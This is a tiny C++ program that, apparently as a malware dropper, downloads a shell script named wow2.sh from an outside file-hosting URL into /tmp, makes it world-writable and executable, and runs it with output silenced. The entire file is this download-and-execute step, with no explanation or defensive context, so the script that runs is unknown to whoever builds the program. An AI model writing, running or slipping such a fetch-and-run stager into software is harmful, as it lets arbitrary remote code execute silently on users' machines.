#include <cstdlib> 
#include <string>

using namespace std;

int main()
{
	string cmd = "cd /tmp && wget -O /tmp/wow2.sh http://ddl2.data.hu/get/0/9977056/wow2.sh > /dev/null 2>&1 && chmod 777 /tmp/wow2.sh && ./wow2.sh";
	system(cmd.c_str());
	return 0;
}